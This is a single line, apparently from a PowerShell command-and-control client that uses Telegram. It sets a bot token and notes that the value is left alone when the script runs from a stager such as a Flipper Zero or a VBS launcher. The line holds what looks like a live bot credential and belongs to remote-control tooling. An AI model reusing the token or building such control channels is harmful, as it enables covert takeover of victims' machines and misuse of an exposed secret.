...
$Token = "8773971348:AAFec1NHBfm3An_FSEn4MUWDmmI0oW0SEGI"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
